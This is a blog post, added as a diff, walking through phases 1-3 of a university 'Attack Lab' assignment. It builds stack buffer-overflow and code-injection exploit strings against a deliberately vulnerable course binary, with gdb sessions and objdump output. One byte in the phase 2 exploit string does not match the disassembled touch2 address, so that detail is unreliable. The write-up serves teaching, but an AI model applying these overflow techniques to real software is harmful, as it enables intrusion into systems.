@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <link rel="stylesheet" href="https://unpkg.com/latex.css/style.min.css" />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack Lab</title>
+    <meta name="og:site_name" content="Navan Chauhan" />
+    <link rel="canonical" href="https://web.navan.dev/" />
+    <meta name="twitter:url" content="https://web.navan.dev/" />
+    <meta name="og:url" content="https://web.navan.dev/" />
+    <meta name="twitter:title" content="Attack Lab" />
+    <meta name="og:title" content="Attack Lab" />
+    <meta name="description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
+    <meta name="twitter:description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
+    <meta name="og:description" content="Walkthrough of Attack Lab Phases 1-3 for CSCI 2400 Computer Systems" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
+    <link rel="alternate" href="/feed.rss" type="application/rss+xml" title="Subscribe to Navan Chauhan" />
+    <meta name="twitter:image" content="https://web.navan.dev/images/opengraph/posts/2023-10-05-attack-lab.png" />
+    <meta name="og:image" content="https://web.navan.dev/images/opengraph/posts/2023-10-05-attack-lab.png" />
+    <link rel="manifest" href="manifest.json" />
+    <meta name="google-site-verification" content="LVeSZxz-QskhbEjHxOi7-BM5dDxTg53x2TwrjFxfL0k" />
+    <script data-goatcounter="https://navanchauhan.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+    <script defer data-domain="web.navan.dev" src="https://plausible.io/js/plausible.js"></script>
+    
+</head>
+<body>
+    <nav style="display: block;">
+|
+<a href="/">home</a> |
+<a href="/about/">about/links</a> |
+<a href="/posts/">posts</a> |
+<a href="/publications/">publications</a> |
+<a href="/repo/">iOS repo</a> |
+<a href="/feed.rss">RSS Feed</a> |
+</nav>
+    
+<main>
+
+	<h1>Attack Lab</h1>
+
+<h2>Introduction</h2>
+
+<p>Lab 3 for CSCI 2400 @ CU Boulder - Computer Systems</p>
+
+<blockquote>
+  <p>This assignment involves generating a total of five attacks on two programs having different security vulnerabilities.  The directions for this lab are detailed but not difficult to follow.</p>
+</blockquote>
+
+<p>Again, I like using objdump to disassemble the code. </p>
+
+<p><code>objdump -d ctarget &gt; dis.txt</code></p>
+
+<h2>Phase 1</h2>
+
+<p>From the instructions, we know that our task is to get <code>CTARGET</code> to execute the code for <code>touch1</code> when <code>getbuf</code> executes its return statement, rather than returning to <code>test</code></p>
+
+<p>Let us try to look into the <code>getbuf</code> from our disassembled code.</p>
+
+<pre><code>0000000000402608 &lt;getbuf&gt;:
+  402608:   48 83 ec 18             sub    $0x18,%rsp
+  40260c:   48 89 e7                mov    %rsp,%rdi
+  40260f:   e8 95 02 00 00          call   4028a9 &lt;Gets&gt;
+  402614:   b8 01 00 00 00          mov    $0x1,%eax
+  402619:   48 83 c4 18             add    $0x18,%rsp
+  40261d:   c3  
+</code></pre>
+
+<pre><code>402608: 48 83 ec 18             sub    $0x18,%rsp
+</code></pre>
+
+<p>We can see that <code>0x18</code> (hex) or <code>24</code> (decimal) bytes of buffer is allocated to <code>getbuf</code> (Since, 24 bytes are being subtracted from the stack pointer).</p>
+
+<p>Now, since we know the buffer size we can try passing the address of the touch1 function.</p>
+
+<pre><code>jxxxan@jupyter-xxxxxx8:~/lab3-attacklab-xxxxxxxxuhan/target66$ cat dis.txt | grep touch1
+000000000040261e &lt;touch1&gt;:
+</code></pre>
+
+<p>We were told in our recitation that our system was little-endian (so the bytes will be in the reverse order). Otherwise, we can use python to check:</p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ python -c 'import sys; print(sys.byteorder)'
+little
+</code></pre>
+
+<p>We have our padding size and the function we need to call, we can write it in <code>ctarget.l1.txt</code></p>
+
+<pre><code>00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1e 26 40 00 00 00 00 00
+</code></pre>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l1.txt | ./ctarget 
+Cookie: 0x3e8dee8f
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+</code></pre>
+
+<h2>Phase 2</h2>
+
+<blockquote>
+  <p>Phase 2 involves injecting a small amount of code as part of your exploit string.</p>
+</blockquote>
+
+<blockquote>
+  <p>Within the file ctarget there is code for a function touch2 having the following C representation:</p>
+</blockquote>
+
+<div class="codehilite">
+<pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">        </span><span class="n">vlevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">cookie</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
+<span class="w">            </span><span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
+<span class="w">            </span><span class="n">fail</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<blockquote>
+  <p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, 
+  however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p>
+</blockquote>
+
+<blockquote>
+  <p>Recall that the first argument to a function is passed in register %rdi</p>
+</blockquote>
+
+<p>This hint tells us that we need to store the cookie in the rdi register</p>
+
+<pre><code>movq $0x3e8dee8f,%rdi 
+retq
+</code></pre>
+
+<p>To get the byte representation, we need to compile the code and then disassemble it.</p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase2.s &amp;&amp; objdump -d phase2.o
+phase2.s: Assembler messages:
+phase2.s: Warning: end of file not at end of a line; newline inserted
+
+phase2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 8f ee 8d 3e    mov    $0x3e8dee8f,%rdi
+   7:   c3                      ret    
+</code></pre>
+
+<p>Thus, the byte representation for our asm code is <code>48 c7 c7 8f ee 8d 3e c3</code></p>
+
+<p>We also need to figure out the address to the <code>%rsp</code> register. Again, looking at the <code>getbuf</code> code</p>
+
+<pre><code>0000000000402608 &lt;getbuf&gt;:
+  402608:   48 83 ec 18             sub    $0x18,%rsp
+  40260c:   48 89 e7                mov    %rsp,%rdi
+  40260f:   e8 95 02 00 00          call   4028a9 &lt;Gets&gt;
+  402614:   b8 01 00 00 00          mov    $0x1,%eax
+  402619:   48 83 c4 18             add    $0x18,%rsp
+  40261d:   c3                      ret
+</code></pre>
+
+<p>We need to find the address of <code>%rsp</code> after calling <code>&lt;Gets&gt;</code> and sending a really long string.</p>
+
+<p>What we are going to do now is to add a break on <code>getbuf</code>, and run the program just after it asks us to enter a string and then find the address of <code>%rsp</code></p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gdb ./ctarget
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./ctarget...
+(gdb) b getbuf
+Breakpoint 1 at 0x402608: file buf.c, line 12.
+(gdb) run
+Starting program: /home/jxxxxn/lab3-attacklab-naxxxan/target66/ctarget 
+Cookie: 0x3e8dee8f
+
+Breakpoint 1, getbuf () at buf.c:12
+12      buf.c: No such file or directory.
+(gdb) disas
+Dump of assembler code for function getbuf:
+=&gt; 0x0000000000402608 &lt;+0&gt;:     sub    $0x18,%rsp
+   0x000000000040260c &lt;+4&gt;:     mov    %rsp,%rdi
+   0x000000000040260f &lt;+7&gt;:     call   0x4028a9 &lt;Gets&gt;
+   0x0000000000402614 &lt;+12&gt;:    mov    $0x1,%eax
+   0x0000000000402619 &lt;+17&gt;:    add    $0x18,%rsp
+   0x000000000040261d &lt;+21&gt;:    ret    
+End of assembler dump.
+(gdb) until *0x402614
+Type string:fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe
+getbuf () at buf.c:15
+15      in buf.c
+(gdb) x/s $rsp
+0x55621b40:     "fnaewuilrgchneaisurcngefsiduerxgecnseriuesgcbnr7ewqdt2348dn564q03278g602365bgn34890765bqv470 trq378t4378gwe"
+(gdb)
+</code></pre>
+
+<p>So, the address for <code>%rsp</code> is <code>0x55621b40</code></p>
+
+<p>Thus, we can set our <code>ctarget.l2.txt</code> as:</p>
+
+<pre><code>byte representation of ASM code
+padding
+address of %rsp
+address of touch2 function
+</code></pre>
+
+<p>To get the address of <code>touch2</code> we can run:</p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch2
+000000000040264e &lt;touch2&gt;:
+  402666:       74 2a                   je     402692 &lt;touch2+0x44&gt;
+  4026b2:       eb d4                   jmp    402688 &lt;touch2+0x3a&gt;
+</code></pre>
+
+<pre><code>48 c7 c7 8f ee 8d 3e c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+40 1b 62 55 00 00 00 00
+4e 26 b2 00 00 00 00 00
+</code></pre>
+
+<p>Do note that our required padding is 24 bytes, we are only adding 16 bytes because our asm code is 8 bytes on its own. Our goal is to have a total of 24 bytes in padding, not 8 + 24 bytes, </p>
+
+<pre><code>joxxxx@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l2.txt | ./ctarget 
+Cookie: 0x3e8dee8f
+Type string:Touch2!: You called touch2(0x3e8dee8f)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+</code></pre>
+
+<h2>Phase 3</h2>
+
+<blockquote>
+  <p>Phase 3 also involves a code injection attack, but passing a string as argument.</p>
+</blockquote>
+
+<blockquote>
+  <p>You will need to include a string representation of your cookie in your exploit string. The string should
+  consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”</p>
+</blockquote>
+
+<blockquote>
+  <p>Your injected code should set register %rdi to the address of this string</p>
+</blockquote>
+
+<blockquote>
+  <p>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
+  portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
+  where you place the string representation of your cookie.</p>
+</blockquote>
+
+<p>Because <code>hexmatch</code> and <code>strncmp</code> might overwrite the buffer allocated for <code>getbuf</code> we will try to store the data after the function <code>touch3</code> itself.</p>
+
+<p>=&gt; The total bytes before the cookie = Buffer (0x18 in our case) + Return Address of %rsp (8 bytes) + Touch 3 (8 Bytes) = 0x18 + 8 + 8 = 28 (hex)</p>
+
+<p>We can use our address for <code>%rsp</code> from phase 2, and simply add <code>0x28</code> to it.</p>
+
+<p>=&gt; <code>0x55621b40</code> + <code>0x28</code> = <code>0x55621B68</code></p>
+
+<p>Again, let us get the binary representation for the ASM code:</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="nf">movq</span><span class="w"> </span><span class="no">$0x55621B68</span><span class="p">,</span><span class="w"> </span><span class="nv">%rdi</span>
+<span class="nf">retq</span>
+</code></pre>
+</div>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase3.s &amp;&amp; objdump -d phase3.o
+phase3.s: Assembler messages:
+phase3.s: Warning: end of file not at end of a line; newline inserted
+
+phase3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 68 1b 62 55    mov    $0x55621b68,%rdi
+   7:   c3                      ret
+</code></pre>
+
+<p>Thus, our answer is going to be in the form:</p>
+
+<pre><code>asm code
+padding
+return address / %rsp
+touch3 address
+cookie string
+</code></pre>
+
+<p>To quickly get the address for <code>touch3</code></p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch3
+0000000000402763 &lt;touch3&gt;:
+  402781:       74 2d                   je     4027b0 &lt;touch3+0x4d&gt;
+  4027d3:       eb d1                   jmp    4027a6 &lt;touch3+0x43&gt;
+</code></pre>
+
+<p>We need to use an ASCII to Hex converter to convert the cookie string into hex.</p>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ echo -n 3e8dee8f | xxd -p
+3365386465653866
+</code></pre>
+
+<p>Thus, our cookie string representation is <code>33 65 38 64 65 65 38 66</code></p>
+
+<pre><code>48 c7 c7 68 1B 62 55 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+40 1b 62 55 00 00 00 00
+63 27 40 00 00 00 00 00
+33 65 38 64 65 65 38 66
+</code></pre>
+
+<pre><code>jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw &lt; ctarget.l3.txt | ./ctarget 
+Cookie: 0x3e8dee8f
+Type string:Touch3!: You called touch3("3e8dee8f")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+</code></pre>
+
+<p>Phases 1-3 Complete.</p>
+
+	<blockquote>If you have scrolled this far, consider subscribing to my mailing list <a href="https://listmonk.navan.dev/subscription/form">here.</a> You can subscribe to either a specific type of post you are interested in, or subscribe to everything with the "Everything" list.</blockquote>
+	<script data-isso="//comments.navan.dev/"
+        src="//comments.navan.dev/js/embed.min.js"></script>
+	<section id="isso-thread">
+	    <noscript>Javascript needs to be activated to view comments.</noscript>
+	</section>
+</main>
+
+
+<script src="assets/manup.min.js"></script>
+<script src="/pwabuilder-sw-register.js"></script>    
+</body>
+</html>
